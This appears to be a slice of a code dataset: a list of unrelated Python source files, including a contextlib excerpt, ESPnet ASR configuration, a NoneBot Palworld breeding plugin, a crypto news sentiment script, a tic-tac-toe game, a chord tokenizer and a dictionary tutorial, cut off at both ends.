{epoch:03d}, Train Loss: {train_loss:.1f}, '\n          f'Val Acc: {val_acc:.3f}, Test Acc: {test_acc:.3f}')",
    "\"\"\"Utilities for with-statement contexts.  See PEP 343.\"\"\"\nimport abc\nimport os\nimport sys\nimport _collections_abc\nfrom collections import deque\nfrom functools import wraps\nfrom types import MethodType, GenericAlias\n\n__all__ = [\"asynccontextmanager\", \"contextmanager\", \"closing\", \"nullcontext\",\n           \"AbstractContextManager\", \"AbstractAsyncContextManager\",\n           \"AsyncExitStack\", \"ContextDecorator\", \"ExitStack\",\n           \"redirect_stdout\", \"redirect_stderr\", \"suppress\", \"aclosing\",\n           \"chdir\"]\n\n\nclass AbstractContextManager(abc.ABC):\n\n    \"\"\"An abstract base class for context managers.\"\"\"\n\n    __class_getitem__ = classmethod(GenericAlias)\n\n    def __enter__(self):\n        \"\"\"Return `self` upon entering the runtime context.\"\"\"\n        return self\n\n    @abc.abstractmethod\n    def __exit__(self, exc_type, exc_value, traceback):\n        \"\"\"Raise any exception triggered within the runtime context.\"\"\"\n        return None\n\n    @classmethod\n    def __subclasshook__(cls, C):\n        if cls is AbstractContextManager:\n            return _collections_abc._check_methods(C, \"__enter__\", \"__exit__\")\n        return NotImplemented\n\n\nclass AbstractAsyncContextManager(abc.ABC):\n\n    \"\"\"An abstract base class for asynchronous context managers.\"\"\"\n\n    __class_getitem__ = classmethod(GenericAlias)\n\n    async def __aenter__(self):\n        \"\"\"Return `self` upon entering the runtime context.\"\"\"\n        return self\n\n    @abc.abstractmethod\n    async def __aexit__(self, exc_type, exc_value, traceback):\n        \"\"\"Raise any exception triggered within the runtime context.\"\"\"\n        return None\n\n    @classmethod\n    def __subclasshook__(cls, C):\n        if cls is AbstractAsyncContextManager:\n            return _collections_abc._check_methods(C, \"__aenter__\",\n                                                   \"__aexit__\")\n        return NotImplemented\n\n\nclass ContextDecorator(object):\n    \"A base class or mixin that enables context managers to work as decorators.\"\n\n    def _recreate_cm(self):\n        \"\"\"Return a recreated instance of self.\n\n        Allows an otherwise one-shot context manager like\n        _GeneratorContextManager to support use as\n        a decorator via implicit recreation.\n\n        This is a private interface just for _GeneratorContextManager.\n        See issue #11647 for details.\n        \"\"\"\n        return self\n\n    def __call__(self, func):\n        @wraps(func)\n        def inner(*args, **kwds):\n            with self._recreate_cm():\n                return func(*args, **kwds)\n        return inner\n\n\nclass AsyncContextDecorator(object):\n    \"A base class or mixin that enables async context managers to work as decorators.\"\n\n    def _recreate_cm(self):\n        \"\"\"Return a recreated instance of self.\n        \"\"\"\n        return self\n\n    def __call__(self, func):\n        @wraps(func)\n        async def inner(*args, **kwds):\n            async with self._recreate_cm():\n                return await func(*args, **kwds)\n        return inner\n\n\nclass _GeneratorContextManagerBase:\n    \"\"\"Shared functionality for @contextmanager and @asynccontextmanager.\"\"\"\n\n    def __init__(self, func, args, kwds):\n        self.gen = func(*args, **kwds)\n        self.func, self.args, self.kwds = func, args, kwds\n        # Issue 19330: ensure context manager instances have good docstrings\n        doc = getattr(func, \"__doc__\", None)\n        if doc is None:\n            doc = type(self).__doc__\n        self.__doc__ = doc\n        # Unfortunately, this still doesn't provide good help output when\n        # inspecting the created context manager instances, since pydoc\n        # currently bypasses the instance docstring and shows the docstring\n        # for the class instead.\n        # See http://bugs.python.org/issue19404 for more details.\n\n    def _recreate_cm(self):\n        # _GCMB instances are one-shot context managers, so the\n        # CM must be recreated each time a decorated function is\n        # called\n        return self.__class__(self.func, self.args, self.kwds)\n\n\nclass _GeneratorContextManager(\n    _GeneratorContextManagerBase,\n    AbstractContextManager,\n    ContextDecorator,\n):\n    \"\"\"Helper for @contextmanager decorator.\"\"\"\n\n    def __enter__(self):\n        # do not keep args and kwds alive unnecessarily\n        # they are only needed for recreation, which is not possible anymore\n        del self.args, self.kwds, self.func\n        try:\n            return next(self.gen)\n        except StopIteration:\n            raise RuntimeError(\"generator didn't yield\") from None\n\n    def __exit__(self, typ, value, traceback):\n        if typ is None:\n            try:\n                next(self.gen)\n            except StopIteration:\n                return False\n            else:\n                try:\n                    raise RuntimeError(\"generator didn't stop\")\n                finally:\n                    self.gen.close()\n        else:\n            if value is None:\n                # Need to force instantiation so we can reliably\n          ",
    "import logging\nimport platform\nimport sys\nfrom rich.logging import RichHandler\n\n\nclass LoggerConfig:\n    def __init__(self, log_to_file=True, log_to_console=True):\n        self.log_to_file = log_to_file\n        self.log_to_console = log_to_console\n        self.configure_logger()\n\n    def configure_logger(self):\n        log_format = \"%(asctime)s - %(name)s - %(levelname)s - %(message)s\"\n        log_datefmt = \"[%X]\"\n        handlers = []\n\n        if self.log_to_console:\n            console_handler = RichHandler(rich_tracebacks=True)\n            console_handler.setLevel(logging.INFO)\n            handlers.append(console_handler)\n\n        if self.log_to_file:\n            file_handler = logging.FileHandler(\"app.log\")\n            file_handler.setLevel(logging.DEBUG)\n            handlers.append(file_handler)\n\n        # Clear existing handlers to avoid duplicate logs\n        for handler in logging.root.handlers[:]:\n            logging.root.removeHandler(handler)\n\n        logging.basicConfig(\n            level=logging.DEBUG,\n            format=log_format,\n            datefmt=log_datefmt,\n            handlers=handlers,\n        )\n\n        self.logger = logging.getLogger(\"rich_logger\")\n        self.add_system_info()\n\n    def add_system_info(self):\n        system_info = f\"\"\"\n        OS: {platform.system()}\n        Version: {platform.version()}\n        Platform: {platform.platform()}\n        Filesystem Encoding: {sys.getfilesystemencoding()}\n        Python Version: {platform.python_version()}\n        \"\"\"\n        self.logger.debug(system_info)\n\n    def get_logger(self):\n        return self.logger\n\n\n# Initialize a global logger instance\nlogger_config = LoggerConfig(log_to_file=True, log_to_console=True)\nlogger = logger_config.get_logger()\n",
    "import argparse\nimport logging\nfrom typing import Callable, Collection, Dict, List, Optional, Tuple\n\nimport numpy as np\nimport torch\nfrom typeguard import check_argument_types, check_return_type\n\nfrom espnet2.asr.ctc import CTC\nfrom espnet2.asr.sactc import BPECTC, SpeakerAwareCTC\nfrom espnet2.asr.decoder.abs_decoder import AbsDecoder\nfrom espnet2.asr.decoder.mlm_decoder import MLMDecoder\nfrom espnet2.asr.decoder.rnn_decoder import RNNDecoder\nfrom espnet2.asr.decoder.transducer_decoder import TransducerDecoder\nfrom espnet2.asr.decoder.transformer_decoder import (\n    DynamicConvolution2DTransformerDecoder,\n    DynamicConvolutionTransformerDecoder,\n    LightweightConvolution2DTransformerDecoder,\n    LightweightConvolutionTransformerDecoder,\n    TransformerDecoder,\n)\nfrom espnet2.asr.encoder.abs_encoder import AbsEncoder\nfrom espnet2.asr.encoder.branchformer_encoder import BranchformerEncoder\nfrom espnet2.asr.encoder.conformer_encoder import ConformerEncoder\nfrom espnet2.asr.encoder.contextual_block_conformer_encoder import (\n    ContextualBlockConformerEncoder,\n)\nfrom espnet2.asr.encoder.contextual_block_transformer_encoder import (\n    ContextualBlockTransformerEncoder,\n)\nfrom espnet2.asr.encoder.hubert_encoder import (\n    FairseqHubertEncoder,\n    FairseqHubertPretrainEncoder,\n)\nfrom espnet2.asr.encoder.longformer_encoder import LongformerEncoder\nfrom espnet2.asr.encoder.rnn_encoder import RNNEncoder\nfrom espnet2.asr.encoder.transformer_encoder import TransformerEncoder\nfrom espnet2.asr.encoder.vgg_rnn_encoder import VGGRNNEncoder\nfrom espnet2.asr.encoder.wav2vec2_encoder import FairSeqWav2Vec2Encoder\nfrom espnet2.asr.espnet_model import ESPnetASRModel\nfrom espnet2.asr.frontend.abs_frontend import AbsFrontend\nfrom espnet2.asr.frontend.default import DefaultFrontend\nfrom espnet2.asr.frontend.fused import FusedFrontends\nfrom espnet2.asr.frontend.s3prl import S3prlFrontend\nfrom espnet2.asr.frontend.windowing import SlidingWindow\nfrom espnet2.asr.maskctc_model import MaskCTCModel\nfrom espnet2.asr.postencoder.abs_postencoder import AbsPostEncoder\nfrom espnet2.asr.postencoder.hugging_face_transformers_postencoder import (\n    HuggingFaceTransformersPostEncoder,\n)\nfrom espnet2.asr.preencoder.abs_preencoder import AbsPreEncoder\nfrom espnet2.asr.preencoder.linear import LinearProjection\nfrom espnet2.asr.preencoder.sinc import LightweightSincConvs\nfrom espnet2.asr.specaug.abs_specaug import AbsSpecAug\nfrom espnet2.asr.specaug.specaug import SpecAug\nfrom espnet2.asr_transducer.joint_network import JointNetwork\nfrom espnet2.layers.abs_normalize import AbsNormalize\nfrom espnet2.layers.global_mvn import GlobalMVN\nfrom espnet2.layers.utterance_mvn import UtteranceMVN\nfrom espnet2.tasks.abs_task import AbsTask\nfrom espnet2.text.phoneme_tokenizer import g2p_choices\nfrom espnet2.torch_utils.initialize import initialize\nfrom espnet2.train.abs_espnet_model import AbsESPnetModel\nfrom espnet2.train.class_choices import ClassChoices\nfrom espnet2.train.collate_fn import CommonCollateFn\nfrom espnet2.train.preprocessor import CommonPreprocessor\nfrom espnet2.train.trainer import Trainer\nfrom espnet2.utils.get_default_kwargs import get_default_kwargs\nfrom espnet2.utils.nested_dict_action import NestedDictAction\nfrom espnet2.utils.types import float_or_none, int_or_none, str2bool, str_or_none\n\nfrontend_choices = ClassChoices(\n    name=\"frontend\",\n    classes=dict(\n        default=DefaultFrontend,\n        sliding_window=SlidingWindow,\n        s3prl=S3prlFrontend,\n        fused=FusedFrontends,\n    ),\n    type_check=AbsFrontend,\n    default=\"default\",\n)\nspecaug_choices = ClassChoices(\n    name=\"specaug\",\n    classes=dict(\n        specaug=SpecAug,\n    ),\n    type_check=AbsSpecAug,\n    default=None,\n    optional=True,\n)\nnormalize_choices = ClassChoices(\n    \"normalize\",\n    classes=dict(\n        global_mvn=GlobalMVN,\n        utterance_mvn=UtteranceMVN,\n    ),\n    type_check=AbsNormalize,\n    default=\"utterance_mvn\",\n    optional=True,\n)\nmodel_choices = ClassChoices(\n    \"model\",\n    classes=dict(\n        espnet=ESPnetASRModel,\n        maskctc=MaskCTCModel,\n    ),\n    type_check=AbsESPnetModel,\n    default=\"espnet\",\n)\npreencoder_choices = ClassChoices(\n    name=\"preencoder\",\n    classes=dict(\n        sinc=LightweightSincConvs,\n        linear=LinearProjection,\n    ),\n    type_check=AbsPreEncoder,\n    default=None,\n    optional=True,\n)\nencoder_choices = ClassChoices(\n    \"encoder\",\n    classes=dict(\n        conformer=ConformerEncoder,\n        transformer=TransformerEncoder,\n        contextual_block_transformer=ContextualBlockTransformerEncoder,\n        contextual_block_conformer=ContextualBlockConformerEncoder,\n        vgg_rnn=VGGRNNEncoder,\n        rnn=RNNEncoder,\n        wav2vec2=FairSeqWav2Vec2Encoder,\n        hubert=FairseqHubertEncoder,\n        hubert_pretrain=FairseqHubertPretrainEncoder,\n        longformer=LongformerEncoder,\n        branchformer=BranchformerEncoder,\n    ),\n    type_check=AbsEncoder,\n    default=\"rnn\",\n)\npostencoder_ch",
    "import json\n\nfrom nonebot import get_plugin_config, get_bot, logger\nfrom nonebot.adapters.onebot.v11 import GroupMessageEvent, MessageSegment\nfrom nonebot.plugin import PluginMetadata\nfrom nonebot.plugin.on import on_regex\nfrom httpx import AsyncClient\n\nfrom .config import Config\n\n__plugin_meta__ = PluginMetadata(\n    name=\"pal_breed\",\n    description=\"\u83b7\u53d6\u5e15\u9c81\u7684\u914d\u79cd\u4fe1\u606f\",\n    homepage=\"nonebot_plugin_palbreed\",\n    usage=\"\u901a\u8fc7\u53d1\u9001\u5bf9\u5e94\u683c\u5f0f\u7684\u6d88\u606f\uff0c\u6765\u83b7\u53d6\u5e15\u9c81\u7684\u914d\u79cd\u4fe1\u606f\",\n    type=\"application\",\n    config=Config,\n)\nconfig = get_plugin_config(Config)\n\n# \u5339\u914d\u683c\u5f0f\uff1a\u4ee5#\u5f00\u5934\uff0c\u4e24\u4e2a\u5b57\u7b26\u4e32\u4e2d\u95f4\u9700\u8981\u6709\u4e00\u4e2a+\u53f7\n\nget_breed = on_regex(r\"^#([\\w\\u4e00-\\u9fa5]+)\\+([\\w\\u4e00-\\u9fa5]+)$\", priority=1, block=True)\nget_process = on_regex(r\"^#([\\w\\u4e00-\\u9fa5]+)$\", priority=1, block=True)\nupload_data = on_regex(r\"^/\u66f4\u65b0\u6570\u636e\", priority=1, block=True)\n\n\nasync def get_breed_list(p1: str, p2: str, p3: str = \"all\") -> dict:\n    url = config.api_url\n    url = url.replace(\"?\", p1, 1).replace(\"?\", p2, 1)\n    if p1 == \"all\" and p2 == \"all\":\n        url = url.replace(\"all.json\", p3 + \".json\", 1)\n    print(url)\n    response = await AsyncClient().get(url)\n    if response.status_code == 200:\n        logger.info(response.url)\n        return response.json()\n    else:\n        return {}\n\n\n@get_breed.handle()\nasync def handle_get_breed(event: GroupMessageEvent):\n    try:\n        re = MessageSegment.reply(event.message_id)\n        f_msg_before = event.get_plaintext().split(\"+\")[0].split(\"#\")[1]\n        f_msg_after = event.get_plaintext().split(\"+\")[1]\n        bot = get_bot()\n        pal_list = config.pal_list\n        await bot.call_api(\"set_group_reaction\", group_id=event.group_id, user_id=event.user_id,\n                           message_id=event.message_id,\n                           code=\"424\", is_add=True)\n        # \u68c0\u67e5f_msg_before\u548cf_msg_after\u662f\u5426\u5728pal_list\u5217\u8868\u4e0b\u5b57\u5178\u7684name\u4e2d\n        parent1_pal = None\n        parent2_pal = None\n        for pal in pal_list:\n            if not isinstance(pal, dict):\n                continue\n            if pal.get(\"name\") == f_msg_before:\n                parent1_pal = pal.get(\"key\")\n            if pal.get(\"name\") == f_msg_after:\n                parent2_pal = pal.get(\"key\")\n\n        if parent1_pal is None or parent2_pal is None:\n            await get_breed.finish(re + f\"{f_msg_before}\u6216{f_msg_after}\u4e0d\u5728\u79cd\u5b50\u5217\u8868\u4e2d\")\n        data = await get_breed_list(parent1_pal, parent2_pal)\n        if not data:\n            await get_breed.finish(re + f\"\u83b7\u53d6\u5931\u8d25\uff01\")\n        result_list = data.get(\"pageProps\").get(\"data\")\n        msg = f\"{f_msg_before}+{f_msg_after}\u7684\u79cd\u65cf\u7e41\u80b2\u7ed3\u679c\u5982\u4e0b\uff1a\\n\"\n        for result in result_list:\n            msg += f\"{result['child_pal']['name']}\\n\"\n        if not result_list or len(result_list) == 0:\n            msg += \"\u6ca1\u6709\u627e\u5230\u7ed3\u679c\uff01\"\n        await get_breed.finish(re + f\"\u83b7\u53d6\u6210\u529f\uff01{msg}\")\n    except Exception:\n        raise\n\n\n@get_process.handle()\nasync def handle_get_process(event: GroupMessageEvent):\n    try:\n        re = MessageSegment.reply(event.message_id)\n        f_msg = event.get_plaintext().split(\"#\")[1]\n        bot = get_bot()\n        pal_list = config.pal_list\n        await bot.call_api(\"set_group_reaction\", group_id=event.group_id, user_id=event.user_id,\n                           message_id=event.message_id, code=\"424\", is_add=True)\n        # \u68c0\u67e5f_msg\u662f\u5426\u5728pal_list\u5217\u8868\u4e0b\u5b57\u5178\u7684name\u4e2d\n        child_pal = None\n        for pal in pal_list:\n            if not isinstance(pal, dict):\n                continue\n            if pal.get(\"name\") == f_msg:\n                child_pal = pal.get(\"key\")\n\n        if child_pal is None:\n            await get_process.finish(re + f\"{f_msg}\u4e0d\u5728\u79cd\u5b50\u5217\u8868\u4e2d\")\n        data = await get_breed_list(\"all\", \"all\", child_pal)\n        if not data:\n            await get_process.finish(re + f\"\u83b7\u53d6\u5931\u8d25\uff01\")\n        result_list = data.get(\"pageProps\").get('data')\n        msg = f\"{f_msg}\u7684\u7e41\u80b2\u8fc7\u7a0b\u5982\u4e0b\uff1a\\n\"\n        for result in result_list:\n            msg += f\"{result['parent1_pal']['name']}+{result['parent2_pal']['name']}\\n\"\n        if not result_list or len(result_list) == 0:\n            msg += \"\u6ca1\u6709\u627e\u5230\u7ed3\u679c\uff01\"\n        await get_process.finish(re + f\"\u83b7\u53d6\u6210\u529f\uff01{msg}\")\n    except Exception:\n        raise\n\n\n@upload_data.handle()\nasync def handle_upload_data(event: GroupMessageEvent):\n    try:\n        re = MessageSegment.reply(event.message_id)\n        await upload_data.send(re + \"\u6b63\u5728\u5c1d\u8bd5\u66f4\u65b0\u6570\u636e\uff0c\u8bf7\u7a0d\u540e...\")\n        async with AsyncClient as client:\n            response = await client.get(\n                \"https://cn.palworldbreed.com/_next/data/QlGgTQeBY0eTQxyIDL1jc/zh-CN/all/all/all.json\")\n\n            options = json.loads(response.text)[\"pageProps\"][\"pals\"]\n            #       \u5bfc\u51fajson\u6587\u4ef6\n            with open(\"./src/plugins/pal_breed/pal_list.json\", \"w\", encoding=\"utf-8\") as f:\n                json.dump(options, f, ensure_ascii=False, indent=4)\n                config.pal_list = options\n                await upload_data.finish(re + \"\u66f4\u65b0\u6210\u529f\uff01\")\n    except Exception:\n        raise\n",
    "\"\"\"\r\n\u4e3b\u7a0b\u5e8f\u5165\u53e3 - AI\u6587\u672c\u5904\u7406\u7cfb\u7edf\r\n\"\"\"\r\n\r\nimport logging\r\nimport argparse\r\nimport os\r\nfrom typing import Dict, List\r\nfrom processor import TextProcessor\r\nfrom analyzer import TopicAnalyzer\r\nfrom crawler import LiteratureCrawler\r\n\r\ndef setup_logging():\r\n    \"\"\"\u914d\u7f6e\u65e5\u5fd7\"\"\"\r\n    logging.basicConfig(\r\n        level=logging.INFO,\r\n        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'\r\n    )\r\n\r\ndef read_input_file(file_path: str) -> str:\r\n    \"\"\"\u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\"\"\"\r\n    try:\r\n        with open(file_path, 'r', encoding='utf-8') as f:\r\n            return f.read()\r\n    except Exception as e:\r\n        logging.error(f\"\u8bfb\u53d6\u6587\u4ef6\u5931\u8d25: {str(e)}\")\r\n        raise\r\n\r\ndef save_output_file(content: str, original_file: str, suffix: str):\r\n    \"\"\"\u4fdd\u5b58\u8f93\u51fa\u6587\u4ef6\"\"\"\r\n    try:\r\n        # \u6784\u5efa\u8f93\u51fa\u6587\u4ef6\u8def\u5f84\r\n        base_name = os.path.splitext(original_file)[0]\r\n        output_file = f\"{base_name}_SCI_{suffix}.txt\"\r\n        \r\n        # \u4fdd\u5b58\u6587\u4ef6\r\n        with open(output_file, 'w', encoding='utf-8') as f:\r\n            f.write(content)\r\n            \r\n        logging.info(f\"\u5df2\u4fdd\u5b58\u5230: {output_file}\")\r\n        \r\n    except Exception as e:\r\n        logging.error(f\"\u4fdd\u5b58\u6587\u4ef6\u5931\u8d25: {str(e)}\")\r\n        raise\r\n\r\ndef main():\r\n    \"\"\"\u4e3b\u51fd\u6570\"\"\"\r\n    # \u8bbe\u7f6e\u65e5\u5fd7\r\n    setup_logging()\r\n    \r\n    # \u89e3\u6790\u547d\u4ee4\u884c\u53c2\u6570\r\n    parser = argparse.ArgumentParser(description='\u5b66\u672f\u8bba\u6587\u751f\u6210\u5668')\r\n    parser.add_argument('input_file', help='\u8f93\u5165\u6587\u4ef6\u8def\u5f84')\r\n    args = parser.parse_args()\r\n    \r\n    try:\r\n        # 1. \u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\r\n        original_text = read_input_file(args.input_file)\r\n        logging.info(\"\u5df2\u8bfb\u53d6\u8f93\u5165\u6587\u4ef6\")\r\n        \r\n        # 2. \u5206\u6790\u4e3b\u9898\u548c\u5173\u952e\u8bcd\r\n        analyzer = TopicAnalyzer()\r\n        topic_info = analyzer.analyze(original_text)\r\n        logging.info(\"\u5df2\u5b8c\u6210\u4e3b\u9898\u5206\u6790\")\r\n        \r\n        # 3. \u722c\u53d6\u76f8\u5173\u6587\u732e\r\n        crawler = LiteratureCrawler()\r\n        references = crawler.crawl_literature(\r\n            topic=topic_info['topic']['en'],\r\n            keywords=topic_info['keywords']['en']\r\n        )\r\n        logging.info(f\"\u5df2\u722c\u53d6 {len(references)} \u7bc7\u76f8\u5173\u6587\u732e\")\r\n        \r\n        # 4. \u5904\u7406\u6587\u672c\r\n        processor = TextProcessor()\r\n        \r\n        # 4.1 \u751f\u6210\u82f1\u6587\u7248\r\n        english_paper = processor.process_english(\r\n            original_text=original_text,\r\n            references=references,\r\n            topic_info=topic_info\r\n        )\r\n        logging.info(\"\u5df2\u751f\u6210\u82f1\u6587\u7248\u8bba\u6587\")\r\n        \r\n        # 4.2 \u751f\u6210\u4e2d\u6587\u7248\r\n        chinese_paper = processor.process_chinese(\r\n            original_text=original_text,\r\n            references=references,\r\n            topic_info=topic_info\r\n        )\r\n        logging.info(\"\u5df2\u751f\u6210\u4e2d\u6587\u7248\u8bba\u6587\")\r\n        \r\n        # 5. \u4fdd\u5b58\u7ed3\u679c\r\n        save_output_file(english_paper, args.input_file, 'EN')\r\n        save_output_file(chinese_paper, args.input_file, 'CN')\r\n        \r\n        logging.info(\"\u5904\u7406\u5b8c\u6210\")\r\n        return 0\r\n        \r\n    except Exception as e:\r\n        logging.error(f\"\u5904\u7406\u5931\u8d25: {str(e)}\")\r\n        return 1\r\n\r\nif __name__ == \"__main__\":\r\n    exit(main()) ",
    "import requests\nfrom textblob import TextBlob\n\nclass CryptoNewsAggregator:\n    NEWS_API_URL = \"https://newsapi.org/v2/everything\"\n    API_KEY = \"your_newsapi_key_here\"  # Replace with your NewsAPI key\n\n    def __init__(self, query=\"cryptocurrency\"):\n        self.query = query\n\n    def fetch_news(self):\n        \"\"\"\n        Fetch cryptocurrency-related news articles using NewsAPI.\n        \"\"\"\n        params = {\n            \"q\": self.query,\n            \"apiKey\": self.API_KEY,\n            \"language\": \"en\",\n            \"sortBy\": \"publishedAt\",\n            \"pageSize\": 10,\n        }\n        try:\n            response = requests.get(self.NEWS_API_URL, params=params)\n            response.raise_for_status()\n            return response.json().get(\"articles\", [])\n        except requests.exceptions.RequestException as e:\n            print(f\"Error fetching news: {e}\")\n            return []\n\n    @staticmethod\n    def analyze_sentiment(text):\n        \"\"\"\n        Analyze sentiment of the given text using TextBlob.\n        Returns a sentiment score: Positive, Neutral, or Negative.\n        \"\"\"\n        analysis = TextBlob(text)\n        if analysis.sentiment.polarity > 0:\n            return \"Positive\"\n        elif analysis.sentiment.polarity == 0:\n            return \"Neutral\"\n        else:\n            return \"Negative\"\n\n    def display_news(self):\n        \"\"\"\n        Fetch and display news articles with sentiment analysis.\n        \"\"\"\n        articles = self.fetch_news()\n        if not articles:\n            print(\"No articles found.\")\n            return\n\n        print(\"\\n--- Cryptocurrency News ---\")\n        for idx, article in enumerate(articles, 1):\n            title = article.get(\"title\", \"No Title\")\n            description = article.get(\"description\", \"No Description\")\n            url = article.get(\"url\", \"#\")\n            sentiment = self.analyze_sentiment(description)\n            print(f\"\\nArticle {idx}: {title}\")\n            print(f\"Description: {description}\")\n            print(f\"Sentiment: {sentiment}\")\n            print(f\"Read more: {url}\")\n\ndef main():\n    print(\"Welcome to the Crypto News Aggregator!\")\n    query = input(\"Enter a keyword to search for news (default: cryptocurrency): \").strip() or \"cryptocurrency\"\n    aggregator = CryptoNewsAggregator(query)\n    aggregator.display_news()\n\nif __name__ == \"__main__\":\n    main()",
    "import os\r\nimport random\r\n\r\n# Initialize the board and players\r\ndef initialize_board():\r\n    return [['-' for _ in range(3)] for _ in range(3)]\r\n\r\ndef display_board(board):\r\n    print(\"\\nCurrent Board:\")\r\n    for row in board:\r\n        print(\" | \".join(row))\r\n        print(\"---+---+---\")\r\n\r\ndef load_game_state():\r\n    if not os.path.exists(\"game_state.txt\"):\r\n        return initialize_board(), 1\r\n\r\n    with open(\"game_state.txt\", \"r\") as file:\r\n        lines = file.readlines()\r\n        board = [line.strip().split(',') for line in lines[:-1]]\r\n        player_turn = int(lines[-1].split(':')[-1].strip())\r\n    return board, player_turn\r\n\r\ndef check_winner(board):\r\n    # Check rows and columns\r\n    for i in range(3):\r\n        if board[i][0] == board[i][1] == board[i][2] and board[i][0] != '-':\r\n            return board[i][0]\r\n        if board[0][i] == board[1][i] == board[2][i] and board[0][i] != '-':\r\n            return board[0][i]\r\n\r\n    # Check diagonals\r\n    if board[0][0] == board[1][1] == board[2][2] and board[0][0] != '-':\r\n        return board[0][0]\r\n    if board[0][2] == board[1][1] == board[2][0] and board[0][2] != '-':\r\n        return board[0][2]\r\n\r\n    return None\r\n\r\ndef is_draw(board):\r\n    return all(cell != '-' for row in board for cell in row)\r\n\r\ndef make_move(board, position, player):\r\n    row, col = divmod(position - 1, 3)\r\n    if board[row][col] == '-':\r\n        board[row][col] = player\r\n        return True\r\n    print(\"Invalid move. Please try again.\")\r\n    return False\r\n\r\ndef ai_move(board):\r\n    # AI selects a random empty position\r\n    empty_positions = [(r, c) for r in range(3) for c in range(3) if board[r][c] == '-']\r\n    if empty_positions:\r\n        row, col = random.choice(empty_positions)\r\n        board[row][col] = 'O'\r\n\r\ndef single_player_mode():\r\n    print(\"Single Player Mode: You are X. AI is O.\")\r\n    board = initialize_board()\r\n    player_turn = 1  # Player starts\r\n\r\n    while True:\r\n        display_board(board)\r\n        winner = check_winner(board)\r\n        if winner:\r\n            if winner == 'X':\r\n                print(\"Congratulations! You win!\")\r\n            else:\r\n                print(\"AI wins. Better luck next time!\")\r\n            break\r\n\r\n        if is_draw(board):\r\n            print(\"It's a draw!\")\r\n            break\r\n\r\n        if player_turn == 1:\r\n            move = input(\"Enter your move (1-9): \").strip()\r\n            if not move.isdigit() or not (1 <= int(move) <= 9):\r\n                print(\"Invalid input. Please enter a number between 1 and 9.\")\r\n                continue\r\n\r\n            if make_move(board, int(move), 'X'):\r\n                player_turn = 2\r\n        else:\r\n            print(\"AI is making a move...\")\r\n            ai_move(board)\r\n            player_turn = 1\r\n\r\ndef two_player_mode():\r\n    print(\"Two Player Mode\")\r\n    board, player_turn = load_game_state()\r\n    players = ['X', 'O']\r\n\r\n    while True:\r\n        display_board(board)\r\n        winner = check_winner(board)\r\n        if winner:\r\n            print(f\"Player {players.index(winner) + 1} ({winner}) wins!\")\r\n            break\r\n\r\n        if is_draw(board):\r\n            print(\"It's a draw!\")\r\n            break\r\n\r\n        print(f\"Player {player_turn}, it's your turn ({players[player_turn - 1]}).\")\r\n        move = input(\"Enter your move (1-9) or 'save' to save the game: \").strip()\r\n\r\n        if move.lower() == 'save':\r\n            save_game_state(board, player_turn)\r\n            continue\r\n\r\n        if not move.isdigit() or not (1 <= int(move) <= 9):\r\n            print(\"Invalid input. Please enter a number between 1 and 9.\")\r\n            continue\r\n\r\n        if make_move(board, int(move), players[player_turn - 1]):\r\n            player_turn = 3 - player_turn\r\n\r\ndef main():\r\n    print(\"Welcome to Tic Tac Toe!\")\r\n    print(\"1. Single Player Mode\")\r\n    print(\"2. Two Player Mode\")\r\n\r\n    choice = input(\"Select mode (1 or 2): \").strip()\r\n    if choice == '1':\r\n        single_player_mode()\r\n    elif choice == '2':\r\n        two_player_mode()\r\n    else:\r\n        print(\"Invalid choice. Exiting.\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "from collections import Counter\n\nclass HooktheoryChordTokenizer:\n    def __init__(\n            self,\n            all_events,\n            max_num_chord_tokens=1200):\n        \n        self.id_to_token = []\n\n        # add reserved tokens\n        reserved_tokens = ['<PAD>', '<SOS>', '<EOS>', '<UNK>']\n        self.id_to_token.extend([('reserved', t) for t in reserved_tokens])\n\n        # Compute chord tokens\n        counts = Counter()\n        for events in all_events:\n            for e in events:\n                if e[0] != 'chord':\n                    continue\n                counts[e[1:]] += 1\n        self.id_to_token.extend([('chord',) + details for details, _ in counts.most_common(max_num_chord_tokens)])\n        oov = sum([c for _, c in counts.most_common()[max_num_chord_tokens:]])\n        print(f'chord <UNK>: {oov}/{sum(counts.values())} ({oov / sum(counts.values()) * 100:.2f}%)')\n\n        # Create reverse map\n        self.token_to_id = {t: i for i, t in enumerate(self.id_to_token)}\n        assert len(self.id_to_token) == len(self.token_to_id)\n        self.pad = self.token_to_id[('reserved', '<PAD>')]\n        self.sos = self.token_to_id[('reserved', '<SOS>')]\n        self.eos = self.token_to_id[('reserved', '<EOS>')]\n        self.unk = self.token_to_id[('reserved', '<UNK>')]\n    \n    def __getitem__(self, idx):\n        return self.id_to_token[idx]\n    \n    def __len__(self):\n        return len(self.id_to_token)\n    \n    def events_to_tokens(self, events: list) -> list:\n        tokens = []\n        tokens.append(self.sos)\n        for e in events:\n            tokens.append(self.token_to_id.get(e, self.unk))\n        tokens.append(self.eos)\n        return tokens\n\n    def tokens_to_events(self, tokens: list) -> list:\n        events = []\n        for t in tokens:\n            t = self.id_to_token[t]\n            if t[0] == 'reserved':\n                if t[1] == '<EOS>':\n                    break\n            else:\n                events.append(t)\n        return events\n    \n    def special_tokens(self):\n        return {\n            'pad': self.pad,\n            'sos': self.sos,\n            'eos': self.eos,\n            'unk': self.unk,\n        }",
    "# Dictionary in Python \n# Dictionaries are use to store data values in key:value pairs\n# They are unordered, mutable(changeable), dont allow duplicate keys\n\n# info = {\n#     \"name\" : \"Parth Patil\",\n#     \"cgpa\" : 9.5,\n#     \"marks\" : [97, 98, 93],\n#     \"is_adult\" : True,\n# }\n# print(info) #Output {'name': 'Parth Patil', 'cgpa': 9.5, 'marks': [97, 98, 93]}\n# print(info[\"name\"]) #Output Parth Patil\n# info[\"name\"] = \"Rudresh Patil\"\n# info[\"name\"] = \"Daksh Patil\"\n# print(info[\"name\"])\n#-----------------------------------------------------------------------------------------------------------------------------------------\n\n# Null Dictionary\n# null = {}\n# print(type(null))\n\n#-----------------------------------------------------------------------------------------------------------------------------------------\n\n# # Nested Dictionary \n# info = {\n#     \"name\": \"Parth Patil\",\n#     \"marks\": {\n#         \"Chem\": 93,\n#         \"Phy\": 93,\n#         \"Maths\": 93,\n#     },\n#     \"Age\": 18\n# }\n# print(info) #Output {'name': 'Parth Patil', 'marks': {'Chem': 93, 'Phy': 93, 'Maths': 93}, 'Age': 18}\n# print(info[\"name\"]) #Output Parth Patil\n# print(info[\"marks\"][\"Chem\"]) #Output 93\n# print(info.keys()) #Output dict_keys(['name', 